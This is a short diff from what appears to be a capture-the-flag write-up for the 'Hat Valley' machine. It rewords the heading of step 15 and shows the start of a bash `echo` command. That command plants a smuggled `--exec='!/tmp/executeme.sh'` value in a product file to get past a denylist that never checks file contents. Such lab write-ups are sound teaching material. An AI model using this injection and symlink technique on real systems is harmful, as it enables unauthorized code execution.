@@ -236,7 +236,7 @@ product-details/<item>.txt, line 2
 
 Both parameters are denylisted, `!` included. The denylist never runs against the file contents, so the payload arrives as data. `>>` follows symlinks.
 
-**15. Stage the payload.**
+**15. Create the product file** with the payload on line 2, plus the script and the symlink.
 
 ```bash
 echo -e '***Hat Valley Product***\npwned --exec='"'"'!/tmp/executeme.sh'"'"'' \
